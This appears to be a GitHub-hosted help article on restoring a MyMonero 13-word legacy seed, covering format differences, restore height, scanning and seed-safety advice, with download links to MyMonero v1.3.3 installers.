<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Restore a MyMonero 13-Word Seed</h1>
<p align="center">Recognize the legacy seed format and restore it without exposing your recovery phrase.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
A 13-word phrase is a MyMonero-specific legacy seed, not the standard 25-word Monero seed format. Restore it using an application flow that explicitly supports a MyMonero seed, and never share the phrase with anyone who offers to help.

## You'll see this if
- Your written recovery phrase contains 13 words.
- A restore screen expects 25 words and rejects your phrase.
- You are moving from MyMonero desktop to Cake Wallet.
- You want to distinguish a seed restore from sending funds to another address.

## Why it happens
MyMonero used two seed formats: a 13-word MyMonero-specific legacy phrase and the standard 25-word Monero phrase. A word count mismatch does not mean that your seed is incomplete. It means the wallet needs to interpret the phrase using the correct format. Do not add twelve guessed words, combine several backups, or treat a partial phrase as a password.

The MyMonero desktop wallet’s final release was v1.3.3. It can still open wallets and send XMR, but it is no longer maintained and has no new features or security updates. The MyMonero hosted servers and web wallet login stopped. You may keep using the desktop app or restore the seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See [the 13-word versus 25-word overview](./mymonero-seed-13-vs-25-words.md) and [migration choices](./mymonero-to-cake-wallet-migration.md) for context.

Restoring a seed recreates access to the wallet; it does not transfer the funds. Scanning begins at a restore height, the blockchain position from which the wallet searches for activity. A restore height that is too recent may miss earlier transactions, while an earlier height takes longer. The [restore-height guide](./mymonero-restore-height-explained.md) describes the trade-off.

---

## Fix
1. **Locate your own backup.** Check the private place where you recorded the phrase. Do not send a photo or text copy to anyone. Nobody legitimate asks for your seed, even if they claim they need it for validation or recovery.
2. **Count without disclosing.** Confirm that the phrase has 13 words. Do not enter it into a web form, search engine, chat, or a person’s support ticket. Seed entry should happen only in the wallet application you intend to use.
3. **Choose a supported restore option.** If you are using Cake Wallet, select restore/import existing wallet and the MyMonero-specific or 13-word route if it is offered. Do not choose a generic 25-word route and try to force the phrase into it. Cake Wallet’s platform availability is iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing.
4. **Enter the phrase carefully.** Check each word against your own backup as you type. Pay attention to spelling, word order, and spaces. Do not guess at an uncertain word. If your backup is damaged or a word cannot be read, pause rather than sending the remaining words to a recovery service.
5. **Provide the restore height.** Use a known reliable height at or before the earliest activity you need to see. If you do not know it, an earlier starting point is safer but requires a longer scan. Avoid entering an arbitrary recent height merely to make setup seem faster.
6. **Wait for synchronization.** The wallet must scan from the chosen point. Keep it open and connected as required by the app. A temporary empty balance during scanning is not proof that your funds are missing.
7. **Check the result.** Confirm that the wallet has finished scanning and review its activity. If older activity is absent, revisit the restore height rather than altering the seed. If the phrase is accepted but the balance appears wrong, consult [balance shows zero](./mymonero-balance-shows-zero.md).
8. **Protect the backup going forward.** Keep a durable, private offline copy. Make sure any duplicate is stored securely and that people around you cannot read it. Never use screenshots or cloud notes as your only record.

> [!TIP]
> The seed format is determined by the original wallet, not by the new device. Keep the original 13-word phrase intact; do not rewrite it as a 25-word phrase.

> [!WARNING]
> A seed phrase grants wallet access. Never disclose it to a person, website, or remote “support” agent. A legitimate helper can explain steps without seeing the phrase.

## If that did not work
If the restore screen only accepts 25 words, back out and look for a flow that specifically supports MyMonero’s legacy format. Do not paste the 13 words into unrelated fields. Check that you installed the intended wallet app from its trusted distribution channel. If you are unsure which flow is correct, use general instructions for [a rejected MyMonero seed](./mymonero-seed-not-accepted.md) without revealing the phrase.

If a word is missing or unreadable, do not assume offline recovery is possible or impossible. The safe next step is to protect what remains and consult trustworthy documentation without publishing any part of the seed. Never provide partial words as proof of ownership.

If restoration completes but no funds appear, verify the scan status and restore height first. An earlier height can require more time. A server connection message, including error 523, is general guidance that the server connection is unavailable; it does not tell you whether the phrase is valid. Do not repeatedly expose the seed in different apps as a troubleshooting shortcut.

## Prevention
Write down the recovery phrase accurately when you control the wallet and keep it away from internet-connected notes. Label the backup in a way that helps you identify its wallet without exposing the words. Keep a separate, non-secret note of the seed format and, if known reliably, the restore height. Recheck that the backup is legible while you still have secure access to it. Use the [seed backup safety guide](./mymonero-backup-seed-safely.md) to review storage practices. Treat any unsolicited request for a phrase as a warning sign.

## FAQ
<details><summary>Is a 13-word seed missing words?</summary>

Not necessarily. MyMonero used a 13-word legacy seed format. It differs from the standard 25-word Monero format.

</details>

<details><summary>Can I add words to make it 25?</summary>

No. Do not add guessed words. Restore using a flow that understands the original 13-word format.

</details>

<details><summary>Does seed restoration send my balance?</summary>

No. It restores access to the same wallet. Sending funds to a new wallet is a separate transaction.

</details>

<details><summary>What if the wallet shows zero?</summary>

Wait for scanning to finish, then check the restore height. Starting too late can omit earlier activity; starting earlier can take longer.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Migrate a MyMonero 25-Word Seed](./mymonero-25-word-seed-migration.md) | Restore a standard Monero phrase in another supported wallet and scan from a suitable height. |
| [MyMonero Restore Height Explained](./mymonero-restore-height-explained.md) | Understand the scan start point and choose a sensible value when restoring a wallet. |
| [Sweep MyMonero Funds to a New Wallet](./mymonero-sweep-funds-new-wallet.md) | Understand what sweeping does and prepare carefully before sending your full balance. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
